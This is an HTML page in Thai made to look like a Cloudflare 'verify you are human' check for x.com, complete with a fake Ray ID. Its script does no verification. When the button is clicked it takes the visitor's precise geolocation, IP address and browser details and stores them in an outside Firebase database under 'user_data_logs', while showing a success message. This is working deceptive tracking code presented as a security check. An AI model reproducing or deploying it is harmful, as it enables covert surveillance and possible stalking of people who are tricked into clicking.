<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>x.com/</title>
    <style>
        /* ตั้งค่าพื้นฐานและการจัดวางให้อยู่กึ่งกลางหน้าจอ */
        body {
            background-color: #222222;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            max-width: 500px;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
        }
        /* ส่วนหัวโลโก้ X และข้อความ x.com/ */
        .header-logo {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            font-size: 22px;
            font-weight: bold;
        }
        /* ข้อความอธิบายด้านบน */
        .instruction {
            font-size: 18px;
            margin-bottom: 30px;
            line-height: 1.4;
        }
        /* กล่องตรวจสอบ (ที่ใส่ปุ่มและโลโก้ Cloudflare) */
        .challenge-box {
            border: 1px solid #444444;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            background-color: #2a2a2a;
            border-radius: 4px;
        }
        /* รูปแบบปุ่ม */
        #trackBtn {
            padding: 12px 16px;
            background-color: #ffffff;
            color: #000000;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            font-size: 15px;
            transition: background-color 0.2s;
        }
        #trackBtn:hover {
            background-color: #e0e0e0;
        }
        #trackBtn:disabled {
            background-color: #888888;
            cursor: not-allowed;
        }
        /* ส่วนโลโก้ Cloudflare และข้อความด้านขวา */
        .cloudflare-logo {
            text-align: right;
            font-size: 10px;
            color: #aaaaaa;
        }
        .cloudflare-logo img {
            width: 90px;
            margin-bottom: 5px;
        }
        .cloudflare-logo a {
            color: #aaaaaa;
            text-decoration: none;
        }
        .cloudflare-logo a:hover {
            text-decoration: underline;
        }
        /* ข้อความด้านล่างกล่อง */
        .footer-text {
            font-size: 15px;
            color: #bbbbbb;
            line-height: 1.5;
        }
        /* ส่วนท้าย (Ray ID) */
        .bottom-info {
            text-align: center;
            font-size: 12px;
            color: #777777;
            margin-top: 60px;
            border-top: 1px solid #444444;
            padding-top: 20px;
            line-height: 1.6;
        }
        /* ส่วนแสดงผลลัพธ์ของ Firebase */
        #status {
            margin-top: 20px;
            font-size: 14px;
            text-align: center;
        }
        #resultBox {
            margin-top: 15px;
            padding: 15px;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 4px;
            display: none;
            font-size: 14px;
            word-wrap: break-word;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- โลโก้ Header -->
        <div class="header-logo">
            <svg viewBox="0 0 24 24" aria-hidden="true" style="width: 28px; fill: white; margin-right: 12px;"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 22.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
            x.com
        </div>
        
        <div class="instruction">
            ตรวจสอบว่าคุณเป็นมนุษย์ด้วยการทำด้านล่างนี้ให้เสร็จสิ้น
        </div>

        <div class="challenge-box">
            <div class="button-container">
                <button id="trackBtn">กดยืนยันว่าคุณคือมนุษย์</button>
            </div>
            <div class="cloudflare-logo">
                <img src="logocf.png" alt="Cloudflare">
                <br>
                <a href="#">ความเป็นส่วนตัว</a> • <a href="#">ข้อกำหนด</a>
            </div>
        </div>

        <div class="footer-text">
            x.com ต้องตรวจสอบความปลอดภัยการเชื่อมต่อของคุณก่อนดำเนินการต่อ
        </div>

        <div id="status"></div>
        <div id="resultBox"></div>

        <div class="bottom-info">
            Ray ID: 969cc5ddfe53d32c<br>
            ประสิทธิภาพและการรักษาความปลอดภัยโดย Cloudflare
        </div>
    </div>

    <!-- โค้ด JavaScript -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js";
        
        // 1. Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyAv7q5JRh_VnsKNqEDBl-60KruafC7fGfw",
            authDomain: "app-ip-line.firebaseapp.com",
            projectId: "app-ip-line",
            storageBucket: "app-ip-line.firebasestorage.app",
            messagingSenderId: "697728554662",
            appId: "1:697728554662:web:73b67252752e97051c4667",
            measurementId: "G-9YQ4CMNEW1"
        };
        
        // เริ่มต้นเชื่อมต่อแอปพลิเคชัน
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // 2. ฟังก์ชันตรวจสอบสถานะสิทธิ์ Location (เพิ่มเข้ามาใหม่)
        async function checkLocationPermission() {
            try {
                // เรียกดูสถานะของ Geolocation
                const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
                
                console.log(`สถานะสิทธิ์ปัจจุบัน: ${permissionStatus.state} เจี๊ยก เจี๊ยก`); 

                if (permissionStatus.state === 'granted') {
                    console.log("ดึงพิกัดได้ทันที เบราว์เซอร์จะไม่เด้งหน้าต่างถามซ้ำ เจี๊ยก เจี๊ยก");
                } else if (permissionStatus.state === 'prompt') {
                    console.log("ถ้าเรียกใช้ Location ตอนนี้ เบราว์เซอร์จะเด้งหน้าต่างถาม เจี๊ยก เจี๊ยก");
                } else if (permissionStatus.state === 'denied') {
                    console.log("ผู้ใช้บล็อกไปแล้ว ต้องแจ้งให้เขาไปเปิดในตั้งค่าเบราว์เซอร์ เจี๊ยก เจี๊ยก");
                }

                // Event Listener เพื่อตรวจจับเวลาที่ผู้ใช้กดปุ่ม 'อนุญาต' หรือ 'บล็อก' บนหน้าต่างเบราว์เซอร์
                permissionStatus.onchange = function() {
                    console.log(`มีการเปลี่ยนสถานะสิทธิ์เป็น: ${this.state} เจี๊ยก เจี๊ยก`);
                    if (this.state === 'granted') {
                        console.log("ผู้ใช้อนุญาตแล้ว! เตรียมดึงพิกัด เจี๊ยก เจี๊ยก");
                    }
                };

            } catch (error) {
                console.error("เบราว์เซอร์นี้ไม่รองรับ Permissions API เจี๊ยก เจี๊ยก", error);
            }
        }

        // เรียกใช้งานเช็คสิทธิ์ทันทีที่หน้าเว็บโหลด
        checkLocationPermission();
        
        // 3. ฟังก์ชันดึงค่า IP Address
        async function fetchIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("ดึง IP ไม่สำเร็จ: ", error);
                return "Unknown IP";
            }
        }

        // 4. ฟังก์ชันขอพิกัด (จะเด้งหน้าต่างแจ้งเตือนถ้าสิทธิ์ยังเป็น 'prompt')
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ status: "Not Supported by Browser", lat: null, lng: null });
                } else {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                status: "Success",
                                lat: position.coords.latitude,
                                lng: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            });
                        },
                        (error) => {
                            let errorMsg = "Unknown Error";
                            if (error.code === 1) errorMsg = "Permission Denied";
                            if (error.code === 2) errorMsg = "Position Unavailable";
                            if (error.code === 3) errorMsg = "Timeout";
                            resolve({ status: errorMsg, lat: null, lng: null });
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                }
            });
        }
        
        // 5. ลอจิกหลักเมื่อกดปุ่มยืนยัน
        document.getElementById("trackBtn").addEventListener("click", async () => {
            const statusText = document.getElementById("status");
            const btn = document.getElementById("trackBtn");
            
            // เปลี่ยนข้อความปุ่มและปิดการกดซ้ำ
            btn.innerText = "กำลังตรวจสอบ...";
            btn.disabled = true;
            statusText.innerText = "";
            
            try {
                // ขั้นตอนนี้ถ้าสถานะสิทธิ์เป็น 'prompt' เบราว์เซอร์จะเด้งหน้าต่างขึ้นมา
                const locationData = await getLocation();
                const ipAddress = await fetchIPAddress();
                const deviceInfo = navigator.userAgent;
                
                // รวมข้อมูล
                const userTrackingData = {
                    ip_address: ipAddress,
                    device_info: deviceInfo,
                    latitude: locationData.lat,
                    longitude: locationData.lng,
                    location_status: locationData.status,
                    timestamp: new Date()
                };
                
                // บันทึกลง Firebase
                await addDoc(collection(db, "user_data_logs"), userTrackingData);
                
                // แสดงสถานะเมื่อเสร็จสมบูรณ์
                statusText.style.color = "#51cf66"; 
                statusText.innerText = "การตรวจสอบเสร็จสมบูรณ์";
                btn.innerText = "ยืนยันแล้ว";
                
            } catch (error) {
                console.error("เกิดข้อผิดพลาด: ", error);
                statusText.style.color = "#ff6b6b"; 
                statusText.innerText = "เกิดข้อผิดพลาดในการตรวจสอบ กรุณาลองใหม่อีกครั้ง";
                btn.innerText = "กดยืนยันว่าคุณคือมนุษย์";
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
